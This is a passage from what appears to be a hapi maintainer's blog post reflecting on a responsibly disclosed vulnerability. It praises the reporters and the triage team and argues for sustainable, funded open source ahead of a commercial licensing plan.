to note and measure but not actually harmful.

### hapi ever-after[​](#hapi-ever-after "Direct link to hapi ever-after")

There are a bunch of things to be grateful for.

The initial disclosure by the Lob team was perfect. It was reported privately,
to the right people, with the right information. They followed up with
additional findings, and gave us the time and space to resolve it the right way.
Lob also was a major sponsor of my work on hapi over the years and that
financial support is critical to allow everything else to happen. More on that
in a bit.

Triage was stressful but staffed with the right people. Having folks like
[Nicolas Morel](https://github.com/Marsup), Nathan, and Matteo, available and
eager to help is critical. This isn't easy to deal with without the pressure,
but with it, mistakes are likely without proper team collaboration.

We got lucky with the actual vulnerability. What started up looking like a
catastrophic problem, ended up being a delicate but straight-forward problem to
address.

We also got lucky by having full access to mitigate it at the source — didn't
need to send emails to some unknown framework maintainer and hope for a quick
answer. hapi's total control over all of its dependencies proved its usefulness
and security again. Not using [hapi](https://hapi.dev)? [Maybe you
should](https://hueniverse.com/why-you-should-consider-hapi-6163689bd7c2).

### The after in happy ever-after[​](#the-after-in-happy-ever-after "Direct link to The after in happy ever-after")

This is where I have to take advantage of this incident to reiterate the cost
and need for sustainable and secure open source.

My time alone on this one issue exceeded 20 hours. That's half a working week.
It came at the end of a month were I already spent over 30 hours publishing a
new major release of hapi (most of the work was done in December). This puts me
at a personal financial loss of over $5000 this month (I had to cut back on paid
client work to make time for it).

If you rely on code I maintain, this is exactly the level of support, quality,
and commitment you want (and lets be honest — expect). Most of you take it for
granted — not just my work but the work of hundreds of other dedicated open
source maintainers.

Because this work is important, I decided to try and make it not just
financially sustainable but to grow and expand it. There is so much to improve.
This is exactly what motivates me to implement the new [commercial licensing
plan](https://web.archive.org/web/20190201220503/https%3A//hueniverse.com/on-hapi-licensing-a-preview-f982662ee898)
coming in March. You can read more about it
